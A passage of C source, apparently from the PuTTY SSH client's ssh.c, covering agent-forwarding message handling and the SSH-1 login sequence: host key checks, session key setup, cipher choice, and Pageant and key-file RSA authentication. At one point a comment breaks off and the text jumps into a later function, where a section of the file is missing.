Don't try to parallelise agent requests. Wait for each one to\n     * return before attempting the next.\n      */\n    if (c->u.a.pending)\n        return;\n\n    /*\n     * If the outgoing side of the channel connection is currently\n     * throttled (for any reason, either that channel's window size or\n     * the entire SSH connection being throttled), don't submit any\n     * new forwarded requests to the real agent. This causes the input\n     * side of the agent forwarding not to be emptied, exerting the\n     * required back-pressure on the remote client, and encouraging it\n     * to read our responses before sending too many more requests.\n     */\n    if (c->ssh->throttled_all ||\n        (c->ssh->version == 2 && c->v.v2.remwindow == 0))\n        return;\n\n    while (1) {\n        /*\n         * Try to extract a complete message from the input buffer.\n         */\n        datalen = bufchain_size(&c->u.a.inbuffer);\n        if (datalen < 4)\n            break;         /* not even a length field available yet */\n\n        bufchain_fetch(&c->u.a.inbuffer, msglen, 4);\n        lengthfield = GET_32BIT(msglen);\n        if (lengthfield > datalen - 4)\n            break;          /* a whole message is not yet available */\n\n        messagelen = lengthfield + 4;\n\n        message = snewn(messagelen, unsigned char);\n        bufchain_fetch(&c->u.a.inbuffer, message, messagelen);\n        bufchain_consume(&c->u.a.inbuffer, messagelen);\n        c->u.a.pending = agent_query(\n            message, messagelen, &reply, &replylen, ssh_agentf_callback, c);\n        sfree(message);\n\n        if (c->u.a.pending)\n            return;   /* agent_query promised to reply in due course */\n\n        /*\n         * If the agent gave us an answer immediately, pass it\n         * straight on and go round this loop again.\n         */\n        ssh_agentf_got_response(c, reply, replylen);\n    }\n\n    /*\n     * If we get here (i.e. we left the above while loop via 'break'\n     * rather than 'return'), that means we've determined that the\n     * input buffer for the agent forwarding connection doesn't\n     * contain a complete request.\n     *\n     * So if there's potentially more data to come, we can return now,\n     * and wait for the remote client to send it. But if the remote\n     * has sent EOF, it would be a mistake to do that, because we'd be\n     * waiting a long time. So this is the moment to check for EOF,\n     * and respond appropriately.\n     */\n    if (c->closes & CLOSES_RCVD_EOF)\n         sshfwd_write_eof(c);\n }\n \nstatic void ssh_agentf_callback(void *cv, void *reply, int replylen)\n{\n    struct ssh_channel *c = (struct ssh_channel *)cv;\n\n    ssh_agentf_got_response(c, reply, replylen);\n    sfree(reply);\n\n    /*\n     * Now try to extract and send further messages from the channel's\n     * input-side buffer.\n     */\n    ssh_agentf_try_forward(c);\n}\n\n /*\n  * Client-initiated disconnection. Send a DISCONNECT if `wire_reason'\n  * non-NULL, otherwise just close the connection. `client_reason' == NULL\n\t\t\t struct Packet *pktin)\n{\n    int i, j, ret;\n    unsigned char cookie[8], *ptr;\n    struct MD5Context md5c;\n    struct do_ssh1_login_state {\n\tint crLine;\n\tint len;\n\tunsigned char *rsabuf;\n        const unsigned char *keystr1, *keystr2;\n\tunsigned long supported_ciphers_mask, supported_auths_mask;\n\tint tried_publickey, tried_agent;\n\tint tis_auth_refused, ccard_auth_refused;\n\tunsigned char session_id[16];\n\tint cipher_type;\n\tvoid *publickey_blob;\n\tint publickey_bloblen;\n\tchar *publickey_comment;\n\tint privatekey_available, privatekey_encrypted;\n\tprompts_t *cur_prompt;\n\tchar c;\n\tint pwpkt_type;\n\tunsigned char request[5], *response, *p;\n\tint responselen;\n\tint keyi, nkeys;\n\tint authed;\n\tstruct RSAKey key;\n\tBignum challenge;\n\tchar *commentp;\n\tint commentlen;\n        int dlgret;\n\tFilename *keyfile;\n        struct RSAKey servkey, hostkey;\n    };\n    crState(do_ssh1_login_state);\n\n    crBeginState;\n\n    if (!pktin)\n\tcrWaitUntil(pktin);\n\n    if (pktin->type != SSH1_SMSG_PUBLIC_KEY) {\n\tbombout((\"Public key packet not received\"));\n\tcrStop(0);\n    }\n\n    logevent(\"Received public keys\");\n\n    ptr = ssh_pkt_getdata(pktin, 8);\n    if (!ptr) {\n\tbombout((\"SSH-1 public key packet stopped before random cookie\"));\n\tcrStop(0);\n    }\n    memcpy(cookie, ptr, 8);\n\n    if (!ssh1_pkt_getrsakey(pktin, &s->servkey, &s->keystr1) ||\n\t!ssh1_pkt_getrsakey(pktin, &s->hostkey, &s->keystr2)) {\t\n\tbombout((\"Failed to read SSH-1 public keys from public key packet\"));\n\tcrStop(0);\n    }\n\n    /*\n     * Log the host key fingerprint.\n     */\n    {\n\tchar logmsg[80];\n\tlogevent(\"Host key fingerprint is:\");\n\tstrcpy(logmsg, \"      \");\n\ts->hostkey.comment = NULL;\n\trsa_fingerprint(logmsg + strlen(logmsg),\n\t\t\tsizeof(logmsg) - strlen(logmsg), &s->hostkey);\n\tlogevent(logmsg);\n    }\n\n    ssh->v1_remote_protoflags = ssh_pkt_getuint32(pktin);\n    s->supported_ciphers_mask = ssh_pkt_getuint32(pktin);\n    s->supported_auths_mask = ssh_pkt_getuint32(pktin);\n    if ((ssh->remote_bugs & BUG_CHOKES_ON_RSA))\n\ts->supported_auths_mask &= ~(1 << SSH1_AUTH_RSA);\n\n    ssh->v1_local_protoflags =\n\tssh->v1_remote_protoflags & SSH1_PROTOFLAGS_SUPPORTED;\n    ssh->v1_local_protoflags |= SSH1_PROTOFLAG_SCREEN_NUMBER;\n\n    MD5Init(&md5c);\n    MD5Update(&md5c, s->keystr2, s->hostkey.bytes);\n    MD5Update(&md5c, s->keystr1, s->servkey.bytes);\n    MD5Update(&md5c, cookie, 8);\n    MD5Final(s->session_id, &md5c);\n\n    for (i = 0; i < 32; i++)\n\tssh->session_key[i] = random_byte();\n\n    /*\n     * Verify that the `bits' and `bytes' parameters match.\n     */\n    if (s->hostkey.bits > s->hostkey.bytes * 8 ||\n\ts->servkey.bits > s->servkey.bytes * 8) {\n\tbombout((\"SSH-1 public keys were badly formatted\"));\n\tcrStop(0);\n    }\n\n    s->len = (s->hostkey.bytes > s->servkey.bytes ?\n              s->hostkey.bytes : s->servkey.bytes);\n\n    s->rsabuf = snewn(s->len, unsigned char);\n\n    /*\n     * Verify the host key.\n     */\n    {\n\t/*\n\t * First format the key into a string.\n\t */\n\tint len = rsastr_len(&s->hostkey);\n\tchar fingerprint[100];\n\tchar *keystr = snewn(len, char);\n\trsastr_fmt(keystr, &s->hostkey);\n\trsa_fingerprint(fingerprint, sizeof(fingerprint), &s->hostkey);\n\n        /* First check against manually configured host keys. */\n        s->dlgret = verify_ssh_manual_host_key(ssh, fingerprint, NULL, NULL);\n        if (s->dlgret == 0) {          /* did not match */\n            bombout((\"Host key did not appear in manually configured list\"));\n            sfree(keystr);\n            crStop(0);\n        } else if (s->dlgret < 0) { /* none configured; use standard handling */\n            ssh_set_frozen(ssh, 1);\n            s->dlgret = verify_ssh_host_key(ssh->frontend,\n                                            ssh->savedhost, ssh->savedport,\n                                            \"rsa\", keystr, fingerprint,\n                                            ssh_dialog_callback, ssh);\n            sfree(keystr);\n#ifdef FUZZING\n\t    s->dlgret = 1;\n#endif\n            if (s->dlgret < 0) {\n                do {\n                    crReturn(0);\n                    if (pktin) {\n                        bombout((\"Unexpected data from server while waiting\"\n                                 \" for user host key response\"));\n                        crStop(0);\n                    }\n                } while (pktin || inlen > 0);\n                s->dlgret = ssh->user_response;\n            }\n            ssh_set_frozen(ssh, 0);\n\n            if (s->dlgret == 0) {\n                ssh_disconnect(ssh, \"User aborted at host key verification\",\n                               NULL, 0, TRUE);\n                crStop(0);\n            }\n        } else {\n            sfree(keystr);\n        }\n    }\n\n    for (i = 0; i < 32; i++) {\n\ts->rsabuf[i] = ssh->session_key[i];\n\tif (i < 16)\n\t    s->rsabuf[i] ^= s->session_id[i];\n    }\n\n    if (s->hostkey.bytes > s->servkey.bytes) {\n\tret = rsaencrypt(s->rsabuf, 32, &s->servkey);\n\tif (ret)\n\t    ret = rsaencrypt(s->rsabuf, s->servkey.bytes, &s->hostkey);\n    } else {\n\tret = rsaencrypt(s->rsabuf, 32, &s->hostkey);\n\tif (ret)\n\t    ret = rsaencrypt(s->rsabuf, s->hostkey.bytes, &s->servkey);\n    }\n    if (!ret) {\n\tbombout((\"SSH-1 public key encryptions failed due to bad formatting\"));\n\tcrStop(0);\t\n    }\n\n    logevent(\"Encrypted session key\");\n\n    {\n\tint cipher_chosen = 0, warn = 0;\n\tconst char *cipher_string = NULL;\n\tint i;\n\tfor (i = 0; !cipher_chosen && i < CIPHER_MAX; i++) {\n\t    int next_cipher = conf_get_int_int(ssh->conf,\n\t\t\t\t\t       CONF_ssh_cipherlist, i);\n\t    if (next_cipher == CIPHER_WARN) {\n\t\t/* If/when we choose a cipher, warn about it */\n\t\twarn = 1;\n\t    } else if (next_cipher == CIPHER_AES) {\n\t\t/* XXX Probably don't need to mention this. */\n\t\tlogevent(\"AES not supported in SSH-1, skipping\");\n\t    } else {\n\t\tswitch (next_cipher) {\n\t\t  case CIPHER_3DES:     s->cipher_type = SSH_CIPHER_3DES;\n\t\t\t\t\tcipher_string = \"3DES\"; break;\n\t\t  case CIPHER_BLOWFISH: s->cipher_type = SSH_CIPHER_BLOWFISH;\n\t\t\t\t\tcipher_string = \"Blowfish\"; break;\n\t\t  case CIPHER_DES:\ts->cipher_type = SSH_CIPHER_DES;\n\t\t\t\t\tcipher_string = \"single-DES\"; break;\n\t\t}\n\t\tif (s->supported_ciphers_mask & (1 << s->cipher_type))\n\t\t    cipher_chosen = 1;\n\t    }\n\t}\n\tif (!cipher_chosen) {\n\t    if ((s->supported_ciphers_mask & (1 << SSH_CIPHER_3DES)) == 0)\n\t\tbombout((\"Server violates SSH-1 protocol by not \"\n\t\t\t \"supporting 3DES encryption\"));\n\t    else\n\t\t/* shouldn't happen */\n\t\tbombout((\"No supported ciphers found\"));\n\t    crStop(0);\n\t}\n\n\t/* Warn about chosen cipher if necessary. */\n\tif (warn) {\n            ssh_set_frozen(ssh, 1);\n\t    s->dlgret = askalg(ssh->frontend, \"cipher\", cipher_string,\n\t\t\t       ssh_dialog_callback, ssh);\n\t    if (s->dlgret < 0) {\n\t\tdo {\n\t\t    crReturn(0);\n\t\t    if (pktin) {\n\t\t\tbombout((\"Unexpected data from server while waiting\"\n\t\t\t\t \" for user response\"));\n\t\t\tcrStop(0);\n\t\t    }\n\t\t} while (pktin || inlen > 0);\n\t\ts->dlgret = ssh->user_response;\n\t    }\n            ssh_set_frozen(ssh, 0);\n\t    if (s->dlgret == 0) {\n\t\tssh_disconnect(ssh, \"User aborted at cipher warning\", NULL,\n\t\t\t       0, TRUE);\n\t\tcrStop(0);\n\t    }\n        }\n    }\n\n    switch (s->cipher_type) {\n      case SSH_CIPHER_3DES:\n\tlogevent(\"Using 3DES encryption\");\n\tbreak;\n      case SSH_CIPHER_DES:\n\tlogevent(\"Using single-DES encryption\");\n\tbreak;\n      case SSH_CIPHER_BLOWFISH:\n\tlogevent(\"Using Blowfish encryption\");\n\tbreak;\n    }\n\n    send_packet(ssh, SSH1_CMSG_SESSION_KEY,\n\t\tPKT_CHAR, s->cipher_type,\n\t\tPKT_DATA, cookie, 8,\n\t\tPKT_CHAR, (s->len * 8) >> 8, PKT_CHAR, (s->len * 8) & 0xFF,\n\t\tPKT_DATA, s->rsabuf, s->len,\n\t\tPKT_INT, ssh->v1_local_protoflags, PKT_END);\n\n    logevent(\"Trying to enable encryption...\");\n\n    sfree(s->rsabuf);\n\n    ssh->cipher = (s->cipher_type == SSH_CIPHER_BLOWFISH ? &ssh_blowfish_ssh1 :\n\t\t   s->cipher_type == SSH_CIPHER_DES ? &ssh_des :\n\t\t   &ssh_3des);\n    ssh->v1_cipher_ctx = ssh->cipher->make_context();\n    ssh->cipher->sesskey(ssh->v1_cipher_ctx, ssh->session_key);\n    logeventf(ssh, \"Initialised %s encryption\", ssh->cipher->text_name);\n\n    ssh->crcda_ctx = crcda_make_context();\n    logevent(\"Installing CRC compensation attack detector\");\n\n    if (s->servkey.modulus) {\n\tsfree(s->servkey.modulus);\n\ts->servkey.modulus = NULL;\n    }\n    if (s->servkey.exponent) {\n\tsfree(s->servkey.exponent);\n\ts->servkey.exponent = NULL;\n    }\n    if (s->hostkey.modulus) {\n\tsfree(s->hostkey.modulus);\n\ts->hostkey.modulus = NULL;\n    }\n    if (s->hostkey.exponent) {\n\tsfree(s->hostkey.exponent);\n\ts->hostkey.exponent = NULL;\n    }\n    crWaitUntil(pktin);\n\n    if (pktin->type != SSH1_SMSG_SUCCESS) {\n\tbombout((\"Encryption not successfully enabled\"));\n\tcrStop(0);\n    }\n\n    logevent(\"Successfully started encryption\");\n\n    fflush(stdout); /* FIXME eh? */\n    {\n\tif ((ssh->username = get_remote_username(ssh->conf)) == NULL) {\n\t    int ret; /* need not be kept over crReturn */\n\t    s->cur_prompt = new_prompts(ssh->frontend);\n\t    s->cur_prompt->to_server = TRUE;\n\t    s->cur_prompt->name = dupstr(\"SSH login name\");\n\t    add_prompt(s->cur_prompt, dupstr(\"login as: \"), TRUE);\n\t    ret = get_userpass_input(s->cur_prompt, NULL, 0);\n\t    while (ret < 0) {\n\t\tssh->send_ok = 1;\n\t\tcrWaitUntil(!pktin);\n\t\tret = get_userpass_input(s->cur_prompt, in, inlen);\n\t\tssh->send_ok = 0;\n\t    }\n\t    if (!ret) {\n\t\t/*\n\t\t * Failed to get a username. Terminate.\n\t\t */\n\t\tfree_prompts(s->cur_prompt);\n\t\tssh_disconnect(ssh, \"No username provided\", NULL, 0, TRUE);\n\t\tcrStop(0);\n\t    }\n\t    ssh->username = dupstr(s->cur_prompt->prompts[0]->result);\n\t    free_prompts(s->cur_prompt);\n\t}\n\n\tsend_packet(ssh, SSH1_CMSG_USER, PKT_STR, ssh->username, PKT_END);\n\t{\n\t    char *userlog = dupprintf(\"Sent username \\\"%s\\\"\", ssh->username);\n\t    logevent(userlog);\n\t    if (flags & FLAG_INTERACTIVE &&\n\t\t(!((flags & FLAG_STDERR) && (flags & FLAG_VERBOSE)))) {\n\t\tc_write_str(ssh, userlog);\n\t\tc_write_str(ssh, \"\\r\\n\");\n\t    }\n\t    sfree(userlog);\n\t}\n    }\n\n    crWaitUntil(pktin);\n\n    if ((s->supported_auths_mask & (1 << SSH1_AUTH_RSA)) == 0) {\n\t/* We must not attempt PK auth. Pretend we've already tried it. */\n\ts->tried_publickey = s->tried_agent = 1;\n    } else {\n\ts->tried_publickey = s->tried_agent = 0;\n    }\n    s->tis_auth_refused = s->ccard_auth_refused = 0;\n    /*\n     * Load the public half of any configured keyfile for later use.\n     */\n    s->keyfile = conf_get_filename(ssh->conf, CONF_keyfile);\n    if (!filename_is_null(s->keyfile)) {\n\tint keytype;\n\tlogeventf(ssh, \"Reading key file \\\"%.150s\\\"\",\n\t\t  filename_to_str(s->keyfile));\n\tkeytype = key_type(s->keyfile);\n\tif (keytype == SSH_KEYTYPE_SSH1 ||\n            keytype == SSH_KEYTYPE_SSH1_PUBLIC) {\n\t    const char *error;\n\t    if (rsakey_pubblob(s->keyfile,\n\t\t\t       &s->publickey_blob, &s->publickey_bloblen,\n\t\t\t       &s->publickey_comment, &error)) {\n                s->privatekey_available = (keytype == SSH_KEYTYPE_SSH1);\n                if (!s->privatekey_available)\n                    logeventf(ssh, \"Key file contains public key only\");\n\t\ts->privatekey_encrypted = rsakey_encrypted(s->keyfile,\n                                                           NULL);\n\t    } else {\n\t\tchar *msgbuf;\n\t\tlogeventf(ssh, \"Unable to load key (%s)\", error);\n\t\tmsgbuf = dupprintf(\"Unable to load key file \"\n\t\t\t\t   \"\\\"%.150s\\\" (%s)\\r\\n\",\n\t\t\t\t   filename_to_str(s->keyfile),\n\t\t\t\t   error);\n\t\tc_write_str(ssh, msgbuf);\n\t\tsfree(msgbuf);\n\t\ts->publickey_blob = NULL;\n\t    }\n\t} else {\n\t    char *msgbuf;\n\t    logeventf(ssh, \"Unable to use this key file (%s)\",\n\t\t      key_type_to_str(keytype));\n\t    msgbuf = dupprintf(\"Unable to use key file \\\"%.150s\\\"\"\n\t\t\t       \" (%s)\\r\\n\",\n\t\t\t       filename_to_str(s->keyfile),\n\t\t\t       key_type_to_str(keytype));\n\t    c_write_str(ssh, msgbuf);\n\t    sfree(msgbuf);\n\t    s->publickey_blob = NULL;\n\t}\n    } else\n\ts->publickey_blob = NULL;\n\n    while (pktin->type == SSH1_SMSG_FAILURE) {\n\ts->pwpkt_type = SSH1_CMSG_AUTH_PASSWORD;\n\n\tif (conf_get_int(ssh->conf, CONF_tryagent) && agent_exists() && !s->tried_agent) {\n\t    /*\n\t     * Attempt RSA authentication using Pageant.\n\t     */\n\t    void *r;\n\n\t    s->authed = FALSE;\n\t    s->tried_agent = 1;\n\t    logevent(\"Pageant is running. Requesting keys.\");\n\n\t    /* Request the keys held by the agent. */\n\t    PUT_32BIT(s->request, 1);\n\t    s->request[4] = SSH1_AGENTC_REQUEST_RSA_IDENTITIES;\n            ssh->auth_agent_query = agent_query(\n                s->request, 5, &r, &s->responselen, ssh_agent_callback, ssh);\n\t    if (ssh->auth_agent_query) {\n\t\tdo {\n\t\t    crReturn(0);\n\t\t    if (pktin) {\n\t\t\tbombout((\"Unexpected data from server while waiting\"\n\t\t\t\t \" for agent response\"));\n\t\t\tcrStop(0);\n\t\t    }\n\t\t} while (pktin || inlen > 0);\n\t\tr = ssh->agent_response;\n\t\ts->responselen = ssh->agent_response_len;\n\t    }\n\t    s->response = (unsigned char *) r;\n\t    if (s->response && s->responselen >= 5 &&\n\t\ts->response[4] == SSH1_AGENT_RSA_IDENTITIES_ANSWER) {\n\t\ts->p = s->response + 5;\n\t\ts->nkeys = toint(GET_32BIT(s->p));\n                if (s->nkeys < 0) {\n                    logeventf(ssh, \"Pageant reported negative key count %d\",\n                              s->nkeys);\n                    s->nkeys = 0;\n                }\n\t\ts->p += 4;\n\t\tlogeventf(ssh, \"Pageant has %d SSH-1 keys\", s->nkeys);\n\t\tfor (s->keyi = 0; s->keyi < s->nkeys; s->keyi++) {\n\t\t    unsigned char *pkblob = s->p;\n\t\t    s->p += 4;\n\t\t    {\n\t\t\tint n, ok = FALSE;\n\t\t\tdo {\t       /* do while (0) to make breaking easy */\n\t\t\t    n = ssh1_read_bignum\n\t\t\t\t(s->p, toint(s->responselen-(s->p-s->response)),\n\t\t\t\t &s->key.exponent);\n\t\t\t    if (n < 0)\n\t\t\t\tbreak;\n\t\t\t    s->p += n;\n\t\t\t    n = ssh1_read_bignum\n\t\t\t\t(s->p, toint(s->responselen-(s->p-s->response)),\n\t\t\t\t &s->key.modulus);\n\t\t\t    if (n < 0)\n                                break;\n\t\t\t    s->p += n;\n\t\t\t    if (s->responselen - (s->p-s->response) < 4)\n\t\t\t\tbreak;\n\t\t\t    s->commentlen = toint(GET_32BIT(s->p));\n\t\t\t    s->p += 4;\n\t\t\t    if (s->commentlen < 0 ||\n                                toint(s->responselen - (s->p-s->response)) <\n\t\t\t\ts->commentlen)\n\t\t\t\tbreak;\n\t\t\t    s->commentp = (char *)s->p;\n\t\t\t    s->p += s->commentlen;\n\t\t\t    ok = TRUE;\n\t\t\t} while (0);\n\t\t\tif (!ok) {\n\t\t\t    logevent(\"Pageant key list packet was truncated\");\n\t\t\t    break;\n\t\t\t}\n\t\t    }\n\t\t    if (s->publickey_blob) {\n\t\t\tif (!memcmp(pkblob, s->publickey_blob,\n\t\t\t\t    s->publickey_bloblen)) {\n\t\t\t    logeventf(ssh, \"Pageant key #%d matches \"\n\t\t\t\t      \"configured key file\", s->keyi);\n\t\t\t    s->tried_publickey = 1;\n\t\t\t} else\n\t\t\t    /* Skip non-configured key */\n\t\t\t    continue;\n\t\t    }\n\t\t    logeventf(ssh, \"Trying Pageant key #%d\", s->keyi);\n\t\t    send_packet(ssh, SSH1_CMSG_AUTH_RSA,\n\t\t\t\tPKT_BIGNUM, s->key.modulus, PKT_END);\n\t\t    crWaitUntil(pktin);\n\t\t    if (pktin->type != SSH1_SMSG_AUTH_RSA_CHALLENGE) {\n\t\t\tlogevent(\"Key refused\");\n\t\t\tcontinue;\n\t\t    }\n\t\t    logevent(\"Received RSA challenge\");\n\t\t    if ((s->challenge = ssh1_pkt_getmp(pktin)) == NULL) {\n\t\t\tbombout((\"Server's RSA challenge was badly formatted\"));\n\t\t\tcrStop(0);\n\t\t    }\n\n\t\t    {\n\t\t\tchar *agentreq, *q, *ret;\n\t\t\tvoid *vret;\n\t\t\tint len, retlen;\n\t\t\tlen = 1 + 4;   /* message type, bit count */\n\t\t\tlen += ssh1_bignum_length(s->key.exponent);\n\t\t\tlen += ssh1_bignum_length(s->key.modulus);\n\t\t\tlen += ssh1_bignum_length(s->challenge);\n\t\t\tlen += 16;     /* session id */\n\t\t\tlen += 4;      /* response format */\n\t\t\tagentreq = snewn(4 + len, char);\n\t\t\tPUT_32BIT(agentreq, len);\n\t\t\tq = agentreq + 4;\n\t\t\t*q++ = SSH1_AGENTC_RSA_CHALLENGE;\n\t\t\tPUT_32BIT(q, bignum_bitcount(s->key.modulus));\n\t\t\tq += 4;\n\t\t\tq += ssh1_write_bignum(q, s->key.exponent);\n\t\t\tq += ssh1_write_bignum(q, s->key.modulus);\n\t\t\tq += ssh1_write_bignum(q, s->challenge);\n\t\t\tmemcpy(q, s->session_id, 16);\n\t\t\tq += 16;\n\t\t\tPUT_32BIT(q, 1);\t/* response format */\n                        ssh->auth_agent_query = agent_query(\n                            agentreq, len + 4, &vret, &retlen,\n                            ssh_agent_callback, ssh);\n\t\t\tif (ssh->auth_agent_query) {\n\t\t\t    sfree(agentreq);\n\t\t\t    do {\n\t\t\t\tcrReturn(0);\n\t\t\t\tif (pktin) {\n\t\t\t\t    bombout((\"Unexpected data from server\"\n\t\t\t\t\t     \" while waiting for agent\"\n\t\t\t\t\t     \" response\"));\n\t\t\t\t    crStop(0);\n\t\t\t\t}\n\t\t\t    } while (pktin || inlen > 0);\n\t\t\t    vret = ssh->agent_response;\n\t\t\t    retlen = ssh->agent_response_len;\n\t\t\t} else\n\t\t\t    sfree(agentreq);\n\t\t\tret = vret;\n\t\t\tif (ret) {\n\t\t\t    if (ret[4] == SSH1_AGENT_RSA_RESPONSE) {\n\t\t\t\tlogevent(\"Sending Pageant's response\");\n\t\t\t\tsend_packet(ssh, SSH1_CMSG_AUTH_RSA_RESPONSE,\n\t\t\t\t\t    PKT_DATA, ret + 5, 16,\n\t\t\t\t\t    PKT_END);\n\t\t\t\tsfree(ret);\n\t\t\t\tcrWaitUntil(pktin);\n\t\t\t\tif (pktin->type == SSH1_SMSG_SUCCESS) {\n\t\t\t\t    logevent\n\t\t\t\t\t(\"Pageant's response accepted\");\n\t\t\t\t    if (flags & FLAG_VERBOSE) {\n\t\t\t\t\tc_write_str(ssh, \"Authenticated using\"\n\t\t\t\t\t\t    \" RSA key \\\"\");\n\t\t\t\t\tc_write(ssh, s->commentp,\n\t\t\t\t\t\ts->commentlen);\n\t\t\t\t\tc_write_str(ssh, \"\\\" from agent\\r\\n\");\n\t\t\t\t    }\n\t\t\t\t    s->authed = TRUE;\n\t\t\t\t} else\n\t\t\t\t    logevent\n\t\t\t\t\t(\"Pageant's response not accepted\");\n\t\t\t    } else {\n\t\t\t\tlogevent\n\t\t\t\t    (\"Pageant failed to answer challenge\");\n\t\t\t\tsfree(ret);\n\t\t\t    }\n\t\t\t} else {\n\t\t\t    logevent(\"No reply received from Pageant\");\n\t\t\t}\n\t\t    }\n\t\t    freebn(s->key.exponent);\n\t\t    freebn(s->key.modulus);\n\t\t    freebn(s->challenge);\n\t\t    if (s->authed)\n\t\t\tbreak;\n\t\t}\n\t\tsfree(s->response);\n\t\tif (s->publickey_blob && !s->tried_publickey)\n\t\t    logevent(\"Configured key file not in Pageant\");\n\t    } else {\n                logevent(\"Failed to get reply from Pageant\");\n            }\n\t    if (s->authed)\n\t\tbreak;\n\t}\n\tif (s->publickey_blob && s->privatekey_available &&\n            !s->tried_publickey) {\n\t    /*\n\t     * Try public key authentication with the specified\n\t     * key file.\n\t     */\n\t    int got_passphrase; /* need not be kept over crReturn */\n\t    if (flags & FLAG_VERBOSE)\n\t\tc_write_str(ssh, \"Trying public key authentication.\\r\\n\");\n\t    s->keyfile = conf_get_filename(ssh->conf, CONF_keyfile);\n\t    logeventf(ssh, \"Trying public key \\\"%s\\\"\",\n\t\t      filename_to_str(s->keyfile));\n\t    s->tried_publickey = 1;\n\t    got_passphrase = FALSE;\n\t    while (!got_passphrase) {\n\t\t/*\n\t\t * Get a passphrase, if necessary.\n\t\t */\n\t\tchar *passphrase = NULL;    /* only written after crReturn */\n\t\tconst char *error;\n\t\tif (!s->privatekey_encrypted) {\n\t\t    if (flags & FLAG_VERBOSE)\n\t\t\tc_write_str(ssh, \"No passphrase required.\\r\\n\");\n\t\t    passphrase = NULL;\n\t\t} else {\n\t\t    int ret; /* need not be kept over crReturn */\n\t\t    s->cur_prompt = new_prompts(ssh->frontend);\n\t\t    s->cur_prompt->to_server = FALSE;\n\t\t    s->cur_prompt->name = dupstr(\"SSH key passphrase\");\n\t\t    add_prompt(s->cur_prompt,\n\t\t\t       dupprintf(\"Passphrase for key \\\"%.100s\\\": \",\n\t\t\t\t\t s->publickey_comment), FALSE);\n\t\t    ret = get_userpass_input(s->cur_prompt, NULL, 0);\n\t\t    while (ret < 0) {\n\t\t\tssh->send_ok = 1;\n\t\t\tcrWaitUntil(!pktin);\n\t\t\tret = get_userpass_input(s->cur_prompt, in, inlen);\n\t\t\tssh->send_ok = 0;\n\t\t    }\n\t\t    if (!ret) {\n\t\t\t/* Failed to get a passphrase. Terminate. */\n\t\t\tfree_prompts(s->cur_prompt);\n\t\t\tssh_disconnect(ssh, NULL, \"Unable to authenticate\",\n\t\t\t\t       0, TRUE);\n\t\t\tcrStop(0);\n\t\t    }\n\t\t    passphrase = dupstr(s->cur_prompt->prompts[0]->result);\n\t\t    free_prompts(s->cur_prompt);\n\t\t}\n\t\t/*\n\t\t * Try decrypting key with passphrase.\n\t\t */\n\t\ts->keyfile = conf_get_filename(ssh->conf, CONF_keyfile);\n\t\tret = loadrsakey(s->keyfile, &s->key, passphrase,\n\t\t\t\t &error);\n\t\tif (passphrase) {\n\t\t    smemclr(passphrase, strlen(passphrase));\n\t\t    sfree(passphrase);\n\t\t}\n\t\tif (ret == 1) {\n\t\t    /* Correct passphrase. */\n\t\t    got_passphrase = TRUE;\n\t\t} else if (ret == 0) {\n\t\t    c_write_str(ssh, \"Couldn't load private key from \");\n\t\t    c_write_str(ssh, filename_to_str(s->keyfile));\n\t\t    c_write_str(ssh, \" (\");\n\t\t    c_write_str(ssh, error);\n\t\t    c_write_str(ssh, \").\\r\\n\");\n\t\t    got_passphrase = FALSE;\n\t\t    break;\t       /* go and try something else */\n\t\t} else if (ret == -1) {\n\t\t    c_write_str(ssh, \"Wrong passphrase.\\r\\n\"); /* FIXME */\n\t\t    got_passphrase = FALSE;\n\t\t    /* and try again */\n\t\t} else {\n\t\t    assert(0 && \"unexpected return from loadrsakey()\");\n\t\t    got_passphrase = FALSE;   /* placate optimisers */\n\t\t}\n\t    }\n\n\t    if (got_passphrase) {\n\n\t\t/*\n\t\t * Send a public key attempt.\n\t\t */\n\t\tsend_packet(ssh, SSH1_CMSG_AUTH_RSA,\n\t\t\t    PKT_BIGNUM, s->key.modulus, PKT_END);\n\n\t\tcrWaitUntil(pktin);\n\t\tif (pktin->type == SSH1_SMSG_FAILURE) {\n\t\t    c_write_str(ssh, \"Server refused our public key.\\r\\n\");\n\t\t    continue;\t       /* go and try something else */\n\t\t}\n\t\tif (pktin->type != SSH1_SMSG_AUTH_RSA_CHALLENGE) {\n\t\t    bombout((\"Bizarre response to offer of public key\"));\n\t\t    crStop(0);\n\t\t}\n\n\t\t{\n\t\t    int i;\n\t\t    unsigned char buffer[32];\n\t\t    Bignum challenge, response;\n\n\t\t    if ((challenge = ssh1_pkt_getmp(pktin)) == NULL) {\n\t\t\tbombout((\"Server's RSA challenge was badly formatted\"));\n\t\t\tcrStop(0);\n\t\t    }\n\t\t    response = rsadecrypt(challenge, &s->key);\n\t\t    freebn(s->key.private_exponent);/* burn the evidence */\n\n\t\t    for (i = 0; i < 32; i++) {\n\t\t\tbuffer[i] = bignum_byte(response, 31 - i);\n\t\t    }\n\n\t\t    MD5Init(&md5c);\n\t\t    MD5Update(&md5c, buffer, 32);\n\t\t    MD5Update(&md5c, s->session_id, 16);\n\t\t    MD5Final(buffer, &md5c);\n\n\t\t    send_packet(ssh, SSH1_CMSG_AUTH_RSA_RESPONSE,\n\t\t\t\tPKT_DATA, buffer, 16, PKT_END);\n\n\t\t    freebn(challenge);\n\t\t    freebn(response);\n\t\t}\n\n\t\tcrWaitUntil(pktin);\n\t\tif (pktin->type == SSH1_SMSG_FAILURE) {\n\t\t    if (flags & FLAG_VERBOSE)\n\t\t\tc_write_str(ssh, \"Failed to authenticate with\"\n\t\t\t\t    \" our public key.\\r\\n\");\n\t\t    continue;\t       /* go and try something else */\n\t\t} else if (pktin->type != SSH1_SMSG_SUCCESS) {\n\t\t    bombout((\"Bizarre response to RSA authentication response\"));\n\t\t    crStop(0);\n\t\t}\n\n\t\tbreak;\t\t       /* we're through! */\n\t    }\n\n\t}\n\n\t/*\n\t * Otherwise, try various forms of password-like authentication.\n\t */\n\ts->cur_prompt = new_prompts(ssh->frontend);\n\n\tif (conf_get_int(ssh->conf, CONF_try_tis_auth) &&\n\t    (s->supported_auths_mask & (1 << SSH1_AUTH_TIS)) &&\n\t    !s->tis_auth_refused) {\n\t    s->pwpkt_type = SSH1_CMSG_AUTH_TIS_RESPONSE;\n\t    logevent(\"Requested TIS authentication\");\n\t    send_packet(ssh, SSH1_CMSG_AUTH_TIS, PKT_END);\n\t    crWaitUntil(pktin);\n\t    if (pktin->type != SSH1_SMSG_AUTH_TIS_CHALLENGE) {\n\t\tlogevent(\"TIS authentication declined\");\n\t\tif (flags & FLAG_INTERACTIVE)\n\t\t    c_write_str(ssh, \"TIS authentication refused.\\r\\n\");\n\t\ts->tis_auth_refused = 1;\n\t\tcontinue;\n\t    } else 